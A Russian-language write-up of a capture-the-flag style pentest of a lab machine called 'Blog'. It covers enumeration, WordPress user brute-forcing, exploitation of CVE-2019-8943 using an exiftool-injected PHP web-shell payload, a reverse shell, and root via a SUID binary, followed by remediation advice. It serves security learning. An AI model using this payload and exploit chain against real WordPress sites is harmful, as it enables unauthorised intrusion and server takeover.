**Отчет о пентесте машины Blog**

**Цель:** Получение полного доступа к системе (root) на машине Blog.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом проведено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **22/tcp** – SSH (OpenSSH)
- **80/tcp** – HTTP (Apache 2.4.29)
- **139/tcp** – Samba (NetBIOS)
- **445/tcp** – Samba (SMB)

**1.2. Анализ SMB-шар**  
С помощью `smbclient` выполнено перечисление доступных шар. Обнаружена общедоступная шара **`billySMB`**, содержащая следующие файлы:

- `Alice-White-Rabbit.jpg`
- `tswift.mp4`
- `check-this.png`


### 2. Анализ файлов и стеганография

**2.1. Извлечение данных из изображений**  
С помощью `steghide` и `stegseek` из файла `Alice-White-Rabbit.jpg` извлечён скрытый файл `rabbit_hole.txt` со следующим содержимым:

```
You've found yourself in a rabbit hole, friend.
```

**2.2. Анализ `check-this.png`**  
В файле `check-this.png` обнаружены Zlib-сжатые данные. Однако извлечь их стандартными методами не удалось — файл оказался повреждён или содержал нестандартную стеганографию.


### 3. Анализ веб-приложения

**3.1. Сканирование директорий**  
На порту 80 обнаружен **WordPress 5.0**. В ходе фаззинга директорий найдены следующие пути:

| Путь | Статус | Примечание |
|------|--------|------------|
| `/2020/05/26/note-from-mom/` | 301 | Запись блога |
| `/2020/05/26/welcome/` | 301 | Запись блога |
| `/wp-admin/` | 302 | Админ-панель |
| `/robots.txt` | 200 | Содержит 67 байт |
| `/server-status` | 403 | Доступ запрещён |

**3.2. Обнаружение уязвимости**  
Для WordPress 5.0 найдена уязвимость **CVE-2019-8943** (wp_crop_image RCE), позволяющая загрузить изображение в произвольную директорию и выполнить PHP-код.

**3.3. Перечисление пользователей**  
С помощью `wpscan` обнаружены следующие пользователи:

- `kwheel`
- `bjoel`
- `Karen Wheeler`
- `Billy Joel`

**3.4. Подбор пароля**  
С помощью `wpscan` найдена валидная пара:

```
Username: kwheel
Password: cutiepie1
```


### 4. Эксплуатация уязвимости и получение доступа

**4.1. Использование эксплойта**  
Скачан и адаптирован эксплойт `RCE_wordpress.py`. В файл `gd.jpg` внедрён PHP-payload через `exiftool`:

```bash
exiftool gd.jpg -CopyrightNotice='<?=`$_GET[c]`?>'
```

**4.2. Запуск эксплойта**  
Выполнена команда:

```bash
python3 exploit.py http://blog.thm/ kwheel cutiepie1 twentytwenty
```

Эксплойт успешно:
- Аутентифицировался.
- Загрузил изображение.
- Изменил путь.
- Создал пост.
- Выдал ссылку: `http://blog.thm/?p=43&0=id`.

**4.3. Получение шелла**  
Через Metasploit (`php/reverse_php`) или `nc` получен reverse shell от пользователя `www-data`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### 5. Эскалация привилегий

**5.1. Анализ домашней директории**  
В `/home/bjoel/` обнаружен PDF-файл `Billy_Joel_Termination_May20-2020.pdf`, содержащий информацию об увольнении.

**5.2. Обнаружение SUID-бинарника**  
Найден файл с SUID-битом:

```
-rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker
```

**5.3. Реверс-инжиниринг бинарника**  
Через Ghidra получен код:

```c
undefined8 main(void)
{
  char *pcVar1;
  pcVar1 = getenv("admin");
  if (pcVar1 == NULL) {
    puts("Not an Admin");
  } else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```

**5.4. Эксплуатация**  
Установлена переменная окружения `admin` и запущен бинарник:

```bash
export admin=1
/usr/sbin/checker
```

Получен root-шелл:

```
uid=0(root) gid=33(www-data) groups=33(www-data)
```


### 6. Итоговый вывод

В ходе пентеста машины Blog были успешно реализованы следующие этапы:

1. **Разведка:** Сканирование портов, анализ SMB-шар, стеганография.
2. **Анализ веб-приложения:** Обнаружение WordPress 5.0, перечисление пользователей, подбор пароля.
3. **Эксплуатация:** Использование CVE-2019-8943 для загрузки PHP-payload и получения reverse shell.
4. **Эскалация привилегий:** Эксплуатация SUID-бинарника `/usr/sbin/checker` через переменную окружения `admin`.

**Результат:** Полный контроль над системой достигнут. Компрометация корневого пользователя подтверждена.


### 7. Рекомендации по устранению

| Уязвимость | Рекомендация |
|------------|--------------|
| **CVE-2019-8943 (WordPress)** | Обновить WordPress до последней версии. |
| **Слабый пароль** | Использовать сложные пароли, включить 2FA. |
| **SUID-бинарник `/usr/sbin/checker`** | Удалить SUID-бит или ограничить доступ. |
